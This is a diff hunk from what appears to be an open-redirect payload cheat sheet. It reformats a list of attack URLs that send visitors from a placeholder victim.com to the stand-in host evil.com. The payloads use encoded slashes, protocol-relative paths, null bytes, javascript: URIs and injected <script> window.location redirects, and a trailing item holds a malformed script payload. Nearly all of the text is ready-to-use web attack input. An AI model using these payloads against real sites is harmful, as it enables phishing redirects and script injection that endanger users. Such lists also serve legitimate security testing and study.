@@ -18,17 +18,18 @@
 ===>>> example: site.com///%5Cevil.com/ 
 
 ===>>> victim.com/page?redirect=http://evil.com
-http://victim.com/page?url=https://evil.com
-http://victim.com/page?next=//evil.com
-http://victim.com/page?return=%2F%2Fevil.com
-http://victim.com/page?redirect=https%3A%2F%2Fevil.com%2F
-http://victim.com/page?redirect=///evil.com
-http://victim.com/page?redirect=\/\evil.com
-http://victim.com/page?redirect=javascript:window.location='http://evil.com'
-http://victim.com/page?redirect=%3Cscript%3Ewindow.location='http://evil.com'%3C%2Fscript%3E
-http://victim.com/page?redirect=//evil.com%00
-http://victim.com/page?redirect=https://evil.com%2F%5C
+===>>> http://victim.com/page?url=https://evil.com
+===>>> http://victim.com/page?next=//evil.com
+===>>> http://victim.com/page?return=%2F%2Fevil.com
+===>>> http://victim.com/page?redirect=https%3A%2F%2Fevil.com%2F
+===>>> http://victim.com/page?redirect=///evil.com
+===>>> http://victim.com/page?redirect=\/\evil.com
+===>>> http://victim.com/page?redirect=javascript:window.location='http://evil.com'
+===>>> http://victim.com/page?redirect=%3Cscript%3Ewindow.location='http://evil.com'%3C%2Fscript%3E
+===>>> http://victim.com/page?redirect=//evil.com%00
+===>>> http://victim.com/page?redirect=https://evil.com%2F%5C
 ===>>>
+
 3 - payload:  </script>window.location"http://evil.com"</script>
 
 
